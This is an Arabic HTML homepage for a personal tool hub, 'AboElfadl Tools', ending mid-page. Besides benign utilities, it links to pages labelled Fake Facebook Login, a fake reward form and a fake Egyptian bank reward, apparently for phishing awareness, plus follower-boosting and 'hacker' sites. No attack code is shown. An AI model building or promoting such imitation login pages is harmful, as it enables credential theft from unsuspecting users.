<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AboElfadl Tools</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="manifest" href="/manifest.json">
    <script>
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', function() {
          navigator.serviceWorker.register('/service-worker.js').then(function(registration) {
            // Registration was successful
            console.log('ServiceWorker registration successful with scope: ', registration.scope);
          }, function(err) {
            // registration failed :(
            console.log('ServiceWorker registration failed: ', err);
          });
        });
      }
    </script>
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #000000; /* خلفية سوداء */
            color: #f0f0f0; /* لون نص فاتح (رمادي فاتح جداً) */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
            position: relative; /* لتمكين وضع الأزرار بشكل مطلق */
        }
        .container {
            background-color: #1a1a1a; /* لون أغمق قليلاً للحاوية (أسود داكن جداً) */
            padding: 0px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); /* ظل ذهبي خفيف */
            text-align: center;
            max-width: 600px;
            width: 100%;
            border: 1px solid #333333; /* حدود خفيفة للحاوية */
        }
        h1 {
            color: #FFD700; /* لون ذهبي مميز للعنوان */
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 5px rgba(0,0,0,0.5); /* ظل نص داكن */
        }
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .tool-button {
            background-color: #FFD700; /* لون ذهبي للأزرار */
            color: #000000; /* لون أسود للنص على الأزرار */
            padding: 10px 0px;
            border: none;
            border-radius: 10px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease, border 0.3s ease; /* أضف border للtransition */
            text-decoration: none; /* لإزالة خط الروابط */
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-weight: bold;
            box-sizing: border-box; /* لضمان أن البادينج والحدود لا تزيد من حجم الزر */
        }
        .tool-button:hover {
            background-color: #FFEB80; /* لون ذهبي أفتح عند التمرير */
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); /* ظل ذهبي عند التمرير */
        }
        .tool-button i {
            font-size: 30px; /* حجم الأيقونة */
            color: #000000; /* لون الأيقونة (أسود) */
        }
        .tool-button img { /* للصور التي تستخدم كأيقونات */
            width: 30px;
            height: 30px;
        }

        /* ستايل لعنوان FAKE TEST */
        .fake-test-heading {
            color: #FFD700; /* لون ذهبي */
            font-size: 3em; /* حجم كبير */
            font-weight: bold;
            margin-top: 40px; /* مسافة من الأعلى */
            margin-bottom: 20px; /* مسافة من الأسفل */
            text-shadow: 3px 3px 7px rgba(255, 215, 0, 0.4); /* ظل ذهبي واضح */
            text-align: center; /* توسيط النص */
        }

        /* ستايل خاص بالفوتر لجعله نصًا عاديًا */
        .footer {
            margin-top: 40px;
            font-size: 0.9em;
            color: #aaa;
            cursor: default; /* مؤشر الفأرة العادي */
            text-decoration: none; /* إزالة خط تحت النص */
        }
        .footer:hover {
            color: #aaa; /* يبقى نفس اللون عند التمرير */
        }


        /* حاوية الأزرار العلوية اليسرى */
        .top-left-buttons {
            position: absolute;
            top: 20px;
            left: 5px;
            display: flex;
            flex-direction: column; /* الأزرار تحت بعضها */
            gap: 10px; /* المسافة بين الأزرار */
            z-index: 100;
        }

        /* ستايل الأزرار العلوية (الضبط والملف الشخصي والسجل) */
        .top-left-button {
            background-color: #333333; /* لون خلفية الزر */
            color: #FFD700; /* لون ذهبي للأيقونة */
            border: 2px solid #FFD700; /* حدود ذهبية */
            border-radius: 50%; /* لجعل الزر دائريًا */
            width: 50px; /* حجم الزر */
            height: 50px; /* حجم الزر */
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.5em; /* حجم الأيقونة */
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
        }
        .top-left-button:hover {
            background-color: #444444;
            transform: scale(1.05);
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
        }

        /* ستايل مربع البحث الجديد */
        .search-area {
            width: 100%;
            margin-bottom: 20px; /* مسافة تحت مربع البحث */
            display: flex;
            gap: 10px;
            justify-content: center;
            align-items: center;
            padding: 0 10px; /* بادينج داخلي للمحاذاة داخل الكونتينر */
            box-sizing: border-box;
        }

        .search-input {
            flex-grow: 1; /* لتوسيع مربع الإدخال */
            padding: 10px;
            border: 1px solid #FFD700; /* حدود ذهبية */
            border-radius: 8px;
            background-color: #2a2a2a; /* خلفية داكنة */
            color: #f0f0f0; /* نص فاتح */
            font-size: 1em;
            outline: none; /* إزالة الإطار عند التركيز */
        }

        .search-button, .reset-button {
            padding: 0px 5px;
            background-color: #FFD700; /* لون ذهبي للأزرار */
            color: #000000; /* لون أسود للنص */
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }

        .search-button:hover, .reset-button:hover {
            background-color: #FFEB80;
            transform: translateY(-2px);
        }

        /* ستايل للأزرار المطابقة للبحث */
        .tool-button.highlight-button {
            border: 2px solid #00FF00 !important; /* إطار أخضر مميز */
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6) !important; /* ظل أخضر */
            transform: scale(1.03); /* تكبير طفيف */
        }

        /* ستايل للأزرار المخفية (عام) */
        .tool-button.hidden-button {
            display: none !important; /* إخفاء الزر */
        }
        /* ستايل الزر المخفي افتراضيا */
        .hidden-by-default {
            display: none; /* هذا الكلاس سيجعل الزر مخفيًا عند تحميل الصفحة */
        }


        /* ستايل النافذة المنبثقة (Modal) */
        .modal {
            display: none;
            position: fixed;
            z-index: 200;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background-color: #2a2a2a;
            margin: 15px auto; /* تقليل المارجن العلوي/السفلي */
            padding: 30px;
            border: 1px solid #FFD700;
            border-radius: 10px;
            width: 90%; /* زيادة العرض قليلاً */
            max-width: 500px; /* زيادة أقصى عرض */
            text-align: center;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
            position: relative;
            animation: fadeIn 0.3s ease-out;
        }
        .modal-content h2 {
            color: #FFD700;
            margin-bottom: 20px;
            font-size: 1.8em;
        }
        .modal-content p {
            margin-bottom: 15px;
            line-height: 1.6;
            color: #e0e0e0;
        }
        .modal-content strong {
            color: #FFD700;
        }

        .modal-buttons {
            display: flex;
            justify-content: center; /* توسيط الأزرار */
            gap: 15px; /* مسافة بين الأزرار */
            margin-top: 25px;
            flex-wrap: wrap; /* للسماح للأزرار بالانتقال إلى سطر جديد في الشاشات الصغيرة */
        }
        .modal-buttons button {
            background-color: #FFD700;
            color: #000000;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: background-color 0.3s ease, transform 0.2s ease;
            white-space: nowrap; /* منع انقسام النص في الأزرار */
        }
        .modal-buttons button:hover {
            background-color: #FFEB80;
            transform: translateY(-2px);
        }
        /* الزر الأول في Modal Buttons (مثال: زر الإلغاء) */
        .modal-buttons button:first-child {
            background-color: #555555;
            color: #e0e0e0;
        }
        .modal-buttons button:first-child:hover {
            background-color: #777777;
        }
        .close-button {
            position: absolute;
            top: 10px;
            right: 15px;
            color: #FFD700;
            font-size: 2em;
            font-weight: bold;
            cursor: pointer;
            transition: color 0.3s;
        }
        .close-button:hover {
            color: #FFEB80;
        }

        /* ستايل أقسام المودال الجديدة */
        .modal-section {
            margin-top: 30px;
            border-top: 1px solid #444;
            padding-top: 20px;
            text-align: left; /* محاذاة النص لليسار داخل القسم */
        }
        .modal-section h3 {
            color: #FFD700;
            font-size: 1.5em;
            margin-bottom: 15px;
            text-align: center; /* توسيط عنوان القسم */
        }
        .modal-section .section-buttons {
            display: flex;
            flex-direction: column; /* الأزرار عموديا */
            gap: 15px; /* مسافة بين الأزرار */
        }
        .modal-section .section-button-wrapper {
            display: flex;
            align-items: center;
            gap: 10px; /* مسافة بين الزر وزر النسخ */
        }
        .modal-section .section-button {
            background-color: #FFD700;
            color: #000000;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-weight: bold;
            flex-grow: 1; /* لتوسيع الزر ليملأ المساحة المتاحة */
        }
        .modal-section .section-button:hover {
            background-color: #FFEB80;
            transform: translateY(-2px);
        }
        .copy-button { /* ستايل موحد لأزرار النسخ */
            background-color: #555555;
            color: #FFD700;
            padding: 2px 5px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .copy-button:hover {
            background-color: #777777;
            transform: translateY(-2px);
        }
        .copy-button i {
            color: #FFD700; /* لون أيقونة النسخ ذهبي */
        }

        /* ستايل قائمة سجل البحث */
        .search-history-list, .shortener-history-list {
            list-style: none;
            padding: 0;
            max-height: 250px; /* ارتفاع أقصى للقائمة مع شريط تمرير */
            overflow-y: auto; /* شريط تمرير عمودي */
            margin-bottom: 20px;
            text-align: right; /* محاذاة النص لليمين داخل القائمة */
            background-color: #2a2a2a;
            border-radius: 8px;
            padding: 10px;
            border: 1px solid #444;
        }
        .search-history-list li, .shortener-history-list li {
            background-color: #333333;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            word-break: break-all; /* كسر الكلمات الطويلة لتجنب تجاوز العنصر */
            direction: ltr; /* لضمان عرض الروابط والنصوص الأجنبية بشكل صحيح */
        }
        .search-history-list li:last-child, .shortener-history-list li:last-child {
            margin-bottom: 0;
        }
        .search-history-list li span, .shortener-history-list li .link-item-text {
            flex-grow: 1;
            color: #f0f0f0;
            text-align: right;
            direction: rtl; /* لضمان محاذاة النص العربي لليمين */
            padding-right: 10px; /* مسافة بين النص وزر النسخ */
        }
        .shortener-history-list li .link-pair {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            flex-grow: 1;
        }
        .shortener-history-list li .link-pair span {
            display: block;
            width: 100%;
            text-align: right;
            direction: ltr; /* لضمان عرض الروابط */
            word-break: break-all;
        }
        .shortener-history-list li .link-pair span.original-link {
            font-size: 0.85em;
            color: #aaaaaa;
        }
        .shortener-history-list li .copy-buttons-wrapper {
            display: flex;
            gap: 5px;
        }
        /* ستايل مربعات الاختيار داخل القائمة */
        .history-checkbox {
            margin-left: 10px;
            width: 18px; /* حجم أكبر لمربع الاختيار */
            height: 18px;
            cursor: pointer;
            accent-color: #FFD700; /* لون مربع الاختيار عند التحديد */
        }

        /* ستايل حقول فلترة السجل وأزرار الفرز */
        .history-controls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 15px;
            justify-content: center;
            align-items: center;
        }
        .history-controls input[type="text"] {
            flex-grow: 1;
            padding: 10px;
            border: 1px solid #FFD700;
            border-radius: 8px;
            background-color: #333333;
            color: #f0f0f0;
            font-size: 0.95em;
            outline: none;
            max-width: 200px; /* حد أقصى للعرض */
        }
        .history-controls button, .history-controls select {
            background-color: #FFD700;
            color: #000000;
            padding: 8px 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: bold;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }
        .history-controls button:hover, .history-controls select:hover {
            background-color: #FFEB80;
            transform: translateY(-2px);
        }
        .history-controls select {
            background-color: #555555;
            color: #f0f0f0;
            border: 1px solid #FFD700;
            appearance: none; /* إزالة ستايل المتصفح الافتراضي */
            padding-right: 25px; /* مسافة لرمز السهم المخصص */
            background-image: url('data:image/svg+xml;utf8,<svg fill="%23FFD700" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>');
            background-repeat: no-repeat;
            background-position: left 8px center;
            background-size: 15px;
        }
        .history-controls select option {
            background-color: #555555;
            color: #f0f0f0;
        }

        /* ستايل لقسم اختصار الروابط داخل المودال */
        .link-shortener-input {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #FFD700;
            border-radius: 8px;
            background-color: #333333;
            color: #f0f0f0;
            font-size: 1em;
            direction: ltr; /* لضمان صحة إدخال الروابط */
        }

        .shorten-button {
            background-color: #FFD700;
            color: #000000;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .shorten-button:hover {
            background-color: #FFEB80;
            transform: translateY(-2px);
        }

        .shortened-link-display {
            background-color: #333333;
            color: #00FF00; /* لون أخضر للرابط المختصر */
            padding: 10px;
            border-radius: 8px;
            word-break: break-all;
            margin-top: 15px;
            min-height: 40px; /* لضمان ظهور الخلفية حتى لو فارغة */
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1em;
            direction: ltr; /* لضمان صحة عرض الرابط المختصر */
            text-align: center;
        }
        .shortened-link-display a {
            color: #00FF00; /* لون أخضر للرابط المختصر */
            text-decoration: none;
            font-weight: bold;
            margin-right: 10px; /* مسافة بين الرابط وزر النسخ */
        }
        .shortened-link-display a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #FF0000; /* لون أحمر لرسائل الخطأ */
            margin-top: 10px;
            font-size: 0.9em;
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header-content {
    display: flex;
    align-items: center;
    justify-content: center; /* لتوسيط المحتوى أفقيا */
    padding: 20px;
    flex-wrap: wrap; /* للسماح للعناصر بالانتقال إلى سطر جديد في الشاشات الصغيرة */
    gap: 20px; /* مسافة بين الصورة والاسم */
}

.profile-container {
    width: 150px; /* حجم الفريم الدائري */
    height: 150px;
    border-radius: 50%; /* لجعل الفريم دائريا */
    overflow: hidden; /* لإخفاء أي جزء من الصورة خارج الدائرة */
    border: 5px solid #ffba00; /* لون الفريم (يمكنك تغييره) */
    display: flex;
    justify-content: center;
    align-items: center;
    animation: rotate 10s linear infinite; /* حركة الدوران */
}

.profile-pic {
    width: 100%;
    height: 100%;
    object-fit: cover; /* لضمان تغطية الصورة للمساحة دون تشويه */
    display: block;
}

@keyframes rotate {
    from {
        transform: rotate(0deg);
    }
    to {
        transform: rotate(360deg);
    }
}

.name-container {
    position: relative;
    /* قم بإزالة الـ height الثابتة هذه. سيتكيف الارتفاع مع محتوى النص. */
    /* height: 50px; */
    /* بدلاً من ذلك، يمكننا استخدام min-height لضمان وجود حد أدنى من الارتفاع إذا لزم الأمر */
    min-height: 50px; /* ضمان ارتفاع أدنى، ولكن ليس ثابتًا يقيد المحتوى */
    display: flex; /* اجعله flex container لكي يتمكن h1 من التوسع بشكل صحيح */
    align-items: center; /* لتوسيط النص عموديًا داخل الحاوية */
    overflow: hidden; /* ابقِ هذا كما هو */
}

.typing-effect {
    font-size: 2.5em; /* حجم الخط للاسم */
    color: #FFD700; /* لون الاسم الذهبي */
    white-space: nowrap; /* مهم لمنع انقسام الكلمات */
    overflow: hidden; /* مهم لتأثير الكتابة */
    animation: typing 4s steps(20, end) infinite,
               blink-caret .75s step-end infinite;
    width: 0; /* يبدأ بعرض صفر */
    direction: ltr; /* للتأكد من الكتابة من الشمال لليمين */
}

/* The typing effect */
@keyframes typing {
    from { width: 50% }
    to { width: 100% }
}

/* The typewriter cursor effect */
@keyframes blink-caret {
    from, to { border-color: transparent }
    50% { border-color: orange }
}
    </style>
</head>
<body>
    <div class="top-left-buttons">
        <div class="top-left-button" id="settingsBtn">
            <i class="fas fa-robot"></i>
        </div>
        <div class="top-left-button" id="profileBtn">
            <i class="fas fa-id-badge"></i> </div>
        <div class="top-left-button" id="historyBtn">
            <i class="fas fa-history"></i> </div>
        <div class="top-left-button" id="shortenLinkBtn">
            <i class="fas fa-cut"></i> </div>
    </div>

<div class="header-content">
    <div class="profile-container">
        <img src="icons/mahmoud.png" alt="Mahmoud AboElfadl" class="profile-pic">
    </div>
    <div class="name-container">
        <h1 class="typing-effect">Mahmoud AboElfadl</h1>
    </div>
</div>
        <div class="container">
        <div class="search-area">
            <input type="text" id="button-search-bar" class="search-input" placeholder="ابحث عن أداة...">
            <button id="search-button" class="search-button">بحث</button>
            <button id="reset-button" class="reset-button">إعادة تعيين</button>
        </div>
        <h1>🇪🇬 AboElfadl Tools 🇪🇬</h1>
        <div class="button-grid">
            <a href="image_editor.html" class="tool-button">
                <i class="fas fa-palette"></i> Photo Editor
            </a>
            <a href="qr_generator.html" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/qr-code.png" alt="QR Icon"/>
               Create QR
            </a>
            <a href="temp_mail_visa.html" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/new-post.png" alt="Mail Icon"/>
                Temp Mail &Visa
            </a>
			<a href="aboelfadl_downloud.html" class="tool-button">
                <i class="fas fa-download"></i> AboElfadl Download Media
            </a>
            <a href="calculator.html" class="tool-button">
                <i class="fas fa-calculator"></i>
                Calculator
            </a>
          <a href="my_wifi_tools.html" class="tool-button">
                <i class="fas fa-wifi tools"></i> MY WIFI TooLs
            </a>
			<a href="link.html" class="tool-button">
                <i class="fas fa-link"></i> انشاء كود موقع شخصي
            </a>
	   <a href="AboElfadlPro.html" class="tool-button">
                <i class="fas fa-tools"></i> AboElfadl Tools Pro 
            </a>
          <a href="New_Gallery.html" class="tool-button">
                <i class="fas fa-photo-film"></i> نشاء معرض صور و فيديوهات
            </a>
            <a href="tools_TxT.html" class="tool-button">
                <i class="fas fa-edit"></i>  ادوات النصوص
            </a>
            <a href="tools_DATE.html" class="tool-button">
                <i class="fas fa-calendar-day"></i>  ادوات التاريخ
             </a>
          <a href="Link_Ai.html" class="tool-button">
                <i class="fas fa-link"></i> LINK TOOLS AI <i class="fas fa-robot"></i>
            </a>
          <a href="fas_fa-icon.html" class="tool-button">
                 <i class="fas fa-surprise"></i> مكتبه تحتوي على العديد من الايقونات 
             </a>
			<a href="Proment_generator.html" class="tool-button">
                 <i class="fas fa-file-code"></i> انشاء برومنت
			</a>
			<a href="link_html.html" class="tool-button">
                 <i class="fas fa-file-code"></i> استخراج الروابط <i class="fas fa-link"></i>  
			</a>
			<a href="metro.html" class="tool-button">
                 <i class="fas fa-subway"></i> معرفه سعر تذاكر المترو
			</a>
			<a href="Image_search.html" class="tool-button">
                 <i class="fas fa-search"></i> بحث عن الصور <i class="fas fa-image"></i>
			</a>
			<a href="Learn_the_sound.html" class="tool-button">
                 <i class="fas fa-microphone-alt"></i> معرفة صوت
			</a>
          <a href="web_speech.html" class="tool-button">
                 <i class="fas fa-volume-up"></i> نص منطوق
             </a>
			<a href="check_Camera.html" class="tool-button">
                 <i class="fas fa-camera"></i> كاميرا 
			</a>
			<a href="Electronic_signature.html" class="tool-button">
                 <i class="fas fa-pen-nib"></i> توقيع الالكتروني
  </a>
			<a href="Wheel_of_Fortune.html" class="tool-button">
                 <i class="fas fa-circle-notch"></i> عجله الحظ
			</a>
            <a href="ifram.html" class="tool-button">
                <img src="icons/grid.png" alt="game Logo" class="company-logo"></i> IFRAM 
            </a>

            <a href="c/cezma.html" class="tool-button">
                <img src="c/cezma.png" alt="game Logo" class="company-logo"></i> خدمة عملاء CEZMA 
            </a>

            <a href="Islamic.html" class="tool-button">
                <img src="icons/praying.png" alt="game Logo" class="company-logo"></i> خدمات اسلامية 
            </a>

            <a href="ازرارر.html" class="tool-button">
                <img src="icons/code.png" alt="game Logo" class="company-logo"></i> كود انشاء ازرار ورابط 
            </a>

<a href="toolsai.html" class="tool-button">
                <i class="fas fa-tools"></i> Tools Ai

</a>
<a href="Search_youtube.html" class="tool-button">
              <i class="fab fa-youtube"></i> YouTube Pro
</a>
<a href="https://ebnelnegm.com/" class="tool-button">
             <i class="fas fa-search"></i> Search Number
</a>
<a href="ip.html" class="tool-button">
        🌐 تتبع ip 🌐
</a>
            <a href="#" class="tool-button hidden-by-default" id="secretButton" target="_blank">
                <i class="fas fa-key"></i> زر سري (com)
            </a>
            <a href="#" class="tool-button hidden-by-default" id="secretTvButton" target="_blank">
                <i class="fas fa-tv"></i> زر سري (TV)
            </a>

            <div class="fake-test-heading" style="grid-column: 1 / -1;">Social Media</div>

<a href="profile_links.html" class="tool-button"> 
<img src="https://img.icons8.com/ios-filled/50/000000/link--v1.png" alt="Link Icon" /> link AboElfadl (Profile) </a>

<a href="social_media_links.html" class="tool-button"> 
<i class="fab fa-facebook"></i> Link Social Media 
              <i class="fab fas-whatsapp"></i>
</a>
<a href="number_tools_ai_Whatsapp.html" class="tool-button"> 
                <i class="fab fa-whatsapp-square"></i> Namber Tools
</a>

<a href="telegram /Telegram_channels.html" class="tool-button">
             <i class="fab fa-telegram"></i> Telegram channels
</a>
<a href="WhatsApp_analyst.html" class="tool-button">
<i class="fab fa-whatsapp"></i> محرر الوتساب
</a>
<a href="سيرفرات_تزويد_متابعين.html" class="tool-button">
     <img src="icons/server.png" alt="game Logo" class="company-logo"></i> سيرفرات تزويد متابعين
</a>
            <div class="fake-test-heading" style="grid-column: 1 / -1;">📞 CALL 📶</div>
            <a href="call/vodafone_cash.html" class="tool-button">
                <i class="fas fa-wallet"></i> Vodafone Cash
            </a>
            <a href="call/number_eg.html" class="tool-button">
                <img src="call/sim.png" alt="sim Logo" class="company-logo"></i> شركات الاتصالات
            </a>
            <div class="fake-test-heading" style="grid-column: 1 / -1;">🔜 Code 🔚</div>
            <a href="https://codebeautify.org/source-code-viewer" class="tool-button" target="_blank">
                <i class="fas fa-code"></i> عارض الكود المصدري
            </a>
            <a href="code/html_viewer.html" class="tool-button">
                <i class="fas fa-code"></i> HTML Code Editor
            </a>
            <a href="code/tools.html" class="tool-button">
                <i class="fas fa-code"></i>  Code Tools
            </a>
            <a href="code/HTML_EDITOR.html" class="tool-button">
                <i class="fas fa-code"></i>  HTML EDITOR                  
            </a>
            <div class="fake-test-heading" style="grid-column: 1 / -1;">📨 Chat AI 📨</div>
            <a href="https://gemini.google.com/" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="Qwen Icon"/>
                Gemini Ai
            </a>
            <a href="https://chatgpt.com/" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="GPT Icon"/>
                ChatGPT
            </a>
            <a href="https://chat.mistral.ai/chat" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="MISTRAL Icon"/>
                MISTRAL.AI
            </a>
            <a href="https://kimi.moonshot.cn/" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="KIMI Icon"/>
                KIMI.AI
            </a>
            <a href="https://www.meta.ai/" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="META Icon"/> META.AI
				
            </a>
            <a href="https://grok.com/chat" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/chat.png" alt="GROK Icon"/>
                GROK
            </a>
            <div class="fake-test-heading" style="grid-column: 1 / -1;">🕹 Games 🎮</div>
            <a href="GAMES/Search_for_games_and_apps.html" class="tool-button">
                <i class="fas fa-search"></i> ➡️ Search Game & Apps Mod ⬅️
            </a>
            <a href="GAMES/الكوتشينة.html" class="tool-button">
                <img src="GAMES/card-game.png" alt="game Logo" class="company-logo"></i> ♦️ كوتشينة ♥️
            </a>
            <a href="GAMES/اونو.html" class="tool-button">
                <img src="GAMES/Uno.png" alt="game Logo" class="company-logo"></i> 🎴 اونو 🃏
            </a>
            <a href="GAMES/شطرانج.html" class="tool-button">
                <img src="GAMES/chess.png" alt="game Logo" class="company-logo"></i> 🏅 شطرانج 🏅
            </a>
            <a href="GAMES/دومينو.html" class="tool-button">
                <img src="GAMES/domino.png" alt="game Logo" class="company-logo"></i>  🏆 دومينو 🏆
            </a>
            <a href="GAMES/XO.html" class="tool-button">
                <img src="GAMES/game.png" alt="game Logo" class="company-logo"></i> 🎖 XO 🎖
             </a>
            <div class="fake-test-heading" style="grid-column: 1 / -1;">🚫 FAKE TEST 🚫</div>
            <a href="fake.html" class="tool-button">
                
               🔞 توعية من الاختراقات 🔞
            </a>
            <a href="fake/fake_facebook_login.html" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/facebook-new.png" alt="Facebook Icon"/>
               🔞 Fake Facebook Login 🔞
            </a>
            <a href="fake/fake_reward_form.html" class="tool-button">
                <img src="https://img.icons8.com/ios-filled/50/000000/prize.png" alt="Reward Icon"/>
              🔞  نموذج المكافأة (وهمي) 🔞
            </a>
            <a href="fake/nbe_com_eg.html" class="tool-button">
                <img src="fake/NBE_NET_EG.png" alt="sim Logo" class="company-logo"></i> 🔞 مكافاة البنك الاهلي المصري 🔞
            </a>

         <div class="fake-test-heading" style="grid-column: 1 / -1;">المصمم</div>
         </div>
        <a href="cv_mahmoud.html" class="tool-button" style="margin-top: 20px;" target="_blank">
          🌐 MAHMOUD ABOELFADL 🌐
        </a>
    </div>

    <div id="settingsModal" class="modal">
        <div class="modal-content">
            <span class="close-button" id="closeSettingsModalBtn">&times;</span>
            <h2>Bot Telegram</h2>
            <p>سيتم تحويلك إلى موقع البوت</p>
            <p> Name : <strong>Free Tools Hack</strong></p>
            <p>User Name: <strong>my_aboelfadl_helper_bot</strong></p>
            <div class="modal-buttons">
                <button id="cancelModalBtn">إلغاء</button>
                <button id="confirmRedirectBtn">متابعة الي Site Bot</button>
                <button id="coonfirmRedirectBtn">متابعه الى Telegram Bot</button>
            </div>
        </div>
    </div>

    <div id="profileModal" class="modal">
        <div class="modal-content">
            <span class="close-button" id="closeProfileModalBtn">&times;</span>
            <h2>روابط الملف الشخصي</h2>

            <select id="profileSectionSelect" style="
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
                border: 1px solid #FFD700;
                border-radius: 8px;
                background-color: #333333;
                color: #f0f0f0;
                font-size: 1.1em;
                text-align: center;
                appearance: none;
                background-image: url('data:image/svg+xml;utf8,<svg fill="%23FFD700" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>');
                background-repeat: no-repeat;
                background-position: left 15px center;
                background-size: 20px;
                cursor: pointer;
            ">
                <option value="linkSiteMeSection">Link Site Me</option>
                <option value="hackerSection">Hacker</option>
                <option value="servicesSection">Services</option>
            </select>

            <div id="linkSiteMeSection" class="modal-section">
                <h3>Link Site Me</h3>
                <div class="section-buttons">
                    <div class="section-button-wrapper">
                        <a href="https://news-technolog-hack.blogspot.com/" class="section-button" target="_blank">
                            News Technology Hack
                        </a>
                        <button class="copy-button" data-url="https://news-technolog-hack.blogspot.com/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://mahmoud-aboelfadl.my.canva.site/" class="section-button" target="_blank">
                            Mahmoud AboElfadl
                        </a>
                        <button class="copy-button" data-url="https://mahmoud-aboelfadl.my.canva.site/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://sites.google.com/view/egypt-tech-news/" class="section-button" target="_blank">
                            Egypt Tech News
                        </a>
                        <button class="copy-button" data-url="https://sites.google.com/view/egypt-tech-news/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://sites.google.com/view/king-web-ai/HOME-PAGE" class="section-button" target="_blank">
                            King ♔ Web AI
                        </a>
                        <button class="copy-button" data-url="https://sites.google.com/view/king-web-ai/HOME-PAGE">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
            </div>

            <div id="hackerSection" class="modal-section" style="display: none;">
                <h3>Hacker</h3>
                <div class="section-buttons">
                    <div class="section-button-wrapper">
                        <a href="https://downev.com/profileviewer.html" class="section-button" target="_blank">
                            photo profile viewer
                        </a>
                        <button class="copy-button" data-url="https://downev.com/profileviewer.html">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://online-hackers.com/" class="section-button" target="_blank">
                            Online-Hackers
                        </a>
                        <button class="copy-button" data-url="https://online-hackers.com/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://amr-elsherif.net/" class="section-button" target="_blank">
                            Amr-Elsherif
                        </a>
                        <button class="copy-button" data-url="https://amr-elsherif.net/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://eslamtube.site/" class="section-button" target="_blank">
                            Eslam Tube
                        </a>
                        <button class="copy-button" data-url="https://eslamtube.site/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
            </div>

            <div id="servicesSection" class="modal-section" style="display: none;">
